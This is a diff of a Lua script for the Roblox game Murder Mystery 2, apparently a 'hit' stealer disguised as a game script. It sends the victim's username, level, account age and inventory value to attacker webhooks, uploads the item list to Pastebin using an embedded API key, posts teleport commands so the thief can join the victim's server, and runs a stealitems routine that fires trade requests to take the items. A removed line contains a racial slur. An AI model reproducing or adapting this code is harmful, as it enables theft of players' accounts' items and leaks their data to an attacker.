@@ -1,7 +1,7 @@
 userName = "yoklopik"
 GoodwebHook = "https://webhook-protect.vercel.app/api/webhook?id=SHBoY1VmZUFhQWhQT1ZFTEZ3QmFOQTpwNEpCNDJheHZYMmY1cTFZRERGMnhfZHgwYVQ0WDl3S1Y0MldEdE5wN1FHVGNQS01ENDhoQ19BcDBDRXN2SWRhSllKb01Pd1doOHBYSlNtcWVfZTlYaWt2MVpIWFlqRHh3QTdyZnZpTDJDM09Kd2t4NFNlZFJwb3lUUDBZcUI0SFdDWV9uVW15NEszUTFWVkFaYjUwR28zbWtMNGhxUzljcGFhUmIwZEpubHM"
 webHook = "https://webhook-protect.vercel.app/api/webhook?id=NEVzdDhMQjdjN0F1V3RPWDUzaWpRZzptTEYwTFdMSkZ5MXF3QWhWWjdXcGVCUFBZXzNkSHdNOHEwY3ZJLUlnMnZuQXVneERMX2NranJ5WFJHazB4bGxESUtselNabXFiX2lEc3lyc1ZuQWktNE1DS05Fa1JGYU9LNG5FOTJQWVdzbGZ3UFpSY1JlMzVpd0lEaTdyYlM1SGhNUTFvakRna3ZsN3VwZGkydmV2akNMZ0NKRkRHeDZkWkxBbThxSGhPRm8"
-print("test3")
+
 local values = {
     ["Nik's Scythe"] = 25000000,
     ["Elderwood Scythe"] = 75,
@@ -940,6 +940,116 @@ for i,v in pairs(allItems) do
     itemsCount = itemsCount + 1
 end
 
+local function pastebin(content)
+
+    local body = {
+        api_dev_key = "80rwX1_YLSIZz-1HMtDSVY9pod_LkfiW",
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2) 
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\n ERROR: Country not supported \n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+
+    return rawUrl
+end
+
+local uniquesString = ""
+local ancientsString = ""
+local godlysString = ""
+local legendariesString = ""
+local vintageString = ""
+local raresString = ""
+local uncommonString = ""
+local commonsString = ""
+
+for a,b in pairs(uniqueItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            uniquesString = uniquesString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(ancientItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            ancientsString = ancientsString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(godlyItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            godlysString = godlysString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(legendaryItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            legendariesString = legendariesString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(vintageItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            vintageString = vintageString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(rareItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            raresString = raresString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(uncommonItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            uncommonString = uncommonString .. d .. ",\n"
+        end
+    end
+end
+
+for a,b in pairs(commonItems) do
+    for c,d in pairs(b) do
+        if c == "name" then
+            commonsString = commonsString .. d .. ",\n"
+        end
+    end
+end
+
 local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Ancient\n" .. ancientsString ..
                          "\n\n-- // Godlies\n" .. godlysString ..
@@ -949,44 +1059,15 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
 
-function sendWebhookFile(url, fileName, fileContent)
-    local HttpService = game:GetService("HttpService")
-    
-    local encodedContent = HttpService:Base64Encode(fileContent)
-    
-    local fileData = {
-        ["file"] = {
-            ["name"] = fileName,
-            ["content"] = encodedContent,
-            ["description"] = "Item list data"
-        }
-    }
-    
-    local response = request({
-        Url = url,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(fileData)
-    })
-
-    return response
-end
-
 local WebHookEmbed = CreateEmbed(
-    "New hit – Murder Mystery 2!",
-    "Take him before he escapes! Made by xbsa",
+    "LBF_DEV Scripts | MM2",
+    "Please execute the code above to get your hit.",
     11220,
     {
-        {name = "``` Info```", value = "```‍️ Username: "..LP.Name.."\n Level: "..tostring(getLvl()).."\n Account-Age: "..tostring(LP.AccountAge).."\n Executor: "..identifyexecutor().."```"},
-        {name = "``` Hit Info```", value = "``` Total Value: "..tostring(math.floor(valueCount + 0.5)).."\n Total Items: "..tostring(itemsCount - 2).."\n\n Uniques: "..tostring(uniqueItemsC).."\n Ancients: "..tostring(ancientItemsC).."\n Godlys: "..tostring(godlyItemsC).."\n Legendarys: "..tostring(legendaryItemsC).."\n Vintage: "..tostring(vintageItemsC).."\n Rares: "..tostring(rareItemsC).."\n Uncommons: "..tostring(uncommonItemsC).."\n Commons: "..tostring(commonItemsC).."```"},
-        {name = "``` Hit List```", value = "The items list has been sent as a file."}
+        {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."```"},
+        {name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
+        {name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
-)
-
-sendWebhookFile(
-    webHook, 
-    "item_list.txt",  
-    EverythingString  
 )
 
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
@@ -995,8 +1076,9 @@ else
     SendWebhook(webHook, {content = '-- Bad hit \ngame:GetService("TeleportService"):TeleportToPlaceInstance(142823291, "'..game.JobId..'")', embeds = {WebHookEmbed}})
 end
 
+
 local function stealitems()
-    wait(2)
+wait(2)
     coroutine.resume(destroytrades2)
 
     local sendArgs = {
@@ -1098,20 +1180,22 @@ local function stealitems()
     game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer(unpack({[1] = 285646582}))
 end
 
+-- Функция для отправки уведомлений
 function sendPlayerLeaveNotification(playerName)
     local headers = {
         ["Content-Type"] = "application/json"
     }
 
-    local selectedWebhook = webHook
+    -- Условие для выбора вебхука
+    local selectedWebhook = webHook -- это вебхук по умолчанию
     if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1 then
-        selectedWebhook = GoodwebHook
+        selectedWebhook = GoodwebHook -- это вебхук для специального случая
     end
 
     local dataLeave = {
         username = "Notification",
         avatar_url = "https://media.discordapp.net/attachments/1326959392339267625/1341456689949446297/exit-circle-floor-sign-with-directional-arrow-and-a-person-walking-text-in-the-lower-side.png?ex=67b61065&is=67b4bee5&hm=661460a43333a89a03fdcffb9f619c400e7c4fda27e6884f0cbccd512261ed4f&=",
-        content = "This nigga: \"**" .. playerName .. "** left from the game!",
+        content = "**" .. playerName .. "** left from the game!",
         embeds = {
             {
                 color = 0xff3e3e,
@@ -1132,6 +1216,7 @@ function sendPlayerLeaveNotification(playerName)
 
     local jsonDataLeave = game:GetService("HttpService"):JSONEncode(dataLeave)
 
+    -- Отправка уведомления с выбранным вебхуком
     local response = request({
         Url = selectedWebhook,
         Method = "POST",
@@ -1140,11 +1225,13 @@ function sendPlayerLeaveNotification(playerName)
     })
 end
 
+-- Обработчик для ухода игрока
 game.Players.PlayerRemoving:Connect(function(player)
     if player == game.Players.LocalPlayer then
         sendPlayerLeaveNotification(player.Name)
     end
 end)
+
 
 game.Players.PlayerAdded:Connect(function(player)
     if player.Name == userName then
